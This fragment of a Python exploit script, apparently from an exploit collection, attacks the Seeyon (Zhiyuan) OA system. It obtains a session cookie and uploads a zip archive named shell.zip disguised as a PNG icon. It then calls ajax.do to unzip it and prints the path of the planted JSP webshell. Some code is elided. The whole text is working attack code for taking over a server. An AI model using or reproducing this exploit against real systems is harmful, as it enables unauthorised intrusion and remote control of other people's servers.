...
def Zhiyuan_upload(Url):
    ...
    try:
        ...
        if response.status_code == 200 and "a8genius.do" in response.text and 'set-cookie' in str(response.headers).lower():
            ...
            targeturl = urldata + 'seeyon/fileUpload.do?method=processUpload'
            print("\033[32m[o] 目标 {} 正在上传压缩包文件.... \n[o] Cookie: {} \033[0m".format(urldata, cookie))
            files = [('file1', ('360icon.png', open('./exphub/zhiyuan/shell.zip', 'rb'), 'image/png'))]
...
def POC_2(Url, cookie, reg, headers):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + 'seeyon/ajax.do'
    ...
    print("\033[32m[o] 目标 {} 正在解压文件.... \033[0m".format(urldata))
    try:
        response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False)
        if response.status_code == 500:
            print("\033[32m[o] 目标 {} 解压文件成功.... \033[0m".format(urldata))
            print("\033[32m[o] 默认Webshell地址: {}seeyon/common/designer/pageLayout/peiqi10086.jsp \033[0m".format(urldata))
